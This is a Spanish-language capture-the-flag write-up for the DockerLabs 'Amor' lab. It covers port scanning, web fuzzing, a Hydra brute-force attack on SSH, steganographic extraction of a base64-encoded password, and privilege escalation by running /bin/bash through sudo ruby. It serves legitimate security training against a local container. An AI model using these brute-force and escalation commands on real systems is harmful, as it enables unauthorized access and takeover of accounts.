# DockerLabs - Reto Amor

## Descripción del Ejercicio

Este reto forma parte de la plataforma DockerLabs, orientada a practicar habilidades con Docker mediante laboratorios clasificados por dificultad. En esta ocasión, abordamos el reto de nivel **Fácil** llamado **Amor**, cuyo objetivo es desplegar un contenedor vulnerable, realizar escaneo, explotación por SSH, análisis de imágenes y esteganografía para obtener credenciales privilegiadas.

---

## 🛠️ Despliegue del Laboratorio

### Prerrequisitos
- Tener instalado Docker.

### Descarga del laboratorio

```bash
scp -r amor kali@192.168.1.12:/home/kali/Documents/
```

### Instalación de Docker en Kali (si no está instalado)

```bash
sudo apt install docker.io
```

### Despliegue de la máquina

```bash
./auto_deploy.sh amor.tar
```

---

## 🔎 Escaneo de la Red

### Paso 1: Identificar interfaz de red

```bash
ip add
```

### Paso 2: Descubrir hosts activos

```bash
sudo netdiscover -i docker0 -r 172.17.0.0/24
```

### Paso 3: Escaneo de puertos

```bash
sudo nmap --min-rate 5000 -p- -sS -sV 172.17.0.2
```

---

## 🌐 Enumeración Web

### Fuzzing con Gobuster

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

---

## 🔐 Ataque SSH con Hydra

### Ataque de fuerza bruta con Hydra

```bash
hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10
```

### Conexión SSH y navegación

```bash
ssh carlota@172.17.0.2
cd /carlota/Desktop/fotos/vacaciones
```

### Descarga del archivo

```bash
scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg /home/kali/Documents/amor
```

---

## 🕵️‍♀️ Esteganografía

### Inspección de archivo

```bash
file imagen.jpg
steghide --extract -sf imagen.jpg
```

### Decodificación base64

```bash
echo "ZXNsYWNhc2FkZXBpbnlwb24=" | base64 -d; echo
```

### Escalada de privilegios

```bash
su oscar
sudo -l
sudo /usr/bin/ruby -e 'exec "/bin/bash"'
whoami
```

---

## 📘 Investigación de Herramientas

| Herramienta   | Definición | Funcionalidad | Casos de Uso |
|---------------|------------|---------------|--------------|
| Docker        | Contenedor ligero | Despliegue de entornos aislados | DevOps, pentesting, microservicios |
| SCP           | Secure Copy Protocol | Transferencia de archivos segura por SSH | Migración de archivos, backups |
| Netdiscover   | Detector de redes | Descubrimiento de IPs activas en red local | Pentesting, análisis de red |
| Nmap          | Network Mapper | Escaneo de puertos y detección de servicios | Auditorías de seguridad |
| Gobuster      | Fuerza bruta en directorios web | Fuzzing de rutas en servidores web | Enumeración de contenido oculto |
| Hydra         | Fuerza bruta por protocolos | Descubrimiento de credenciales | Pentesting SSH, FTP, HTTP |
| Steghide      | Herramienta de esteganografía | Ocultamiento/Extracción de datos en imágenes | CTFs, ciberseguridad ofensiva |
| Base64        | Codificación de datos | Ocultar cadenas en base64 | Transmisión de datos, CTFs |
| Ruby console  | Lenguaje de scripting | Ejecución de comandos con permisos | Escalada de privilegios |

---

## 🔍 Variantes y Explicación de Comandos

(Se explicarán en detalle en la siguiente sección complementaria del README)

---

## 🔄 Diagrama de Flujo del Procedimiento

![Diagrama de Flujo del CTF]()

---

## 🧠 Conclusiones

Este laboratorio permitió aplicar múltiples técnicas de reconocimiento, escaneo, acceso remoto, esteganografía y escalada de privilegios de manera práctica y estructurada, reforzando competencias clave para CTFs y pentesting.

---

## 🖼️ Fuentes e Imágenes

- Capturas obtenidas de entorno real de laboratorio

![despliegue](despliegue%20maquina.png)

![Escaneo](escaneo%20puertos.png)

![Diagrama de Flujo del CTF]()
- Diccionarios: `rockyou.txt`, `dirbuster`
- Imagen descargada en `/Desktop/fotos/vacaciones/imagen.jpg`

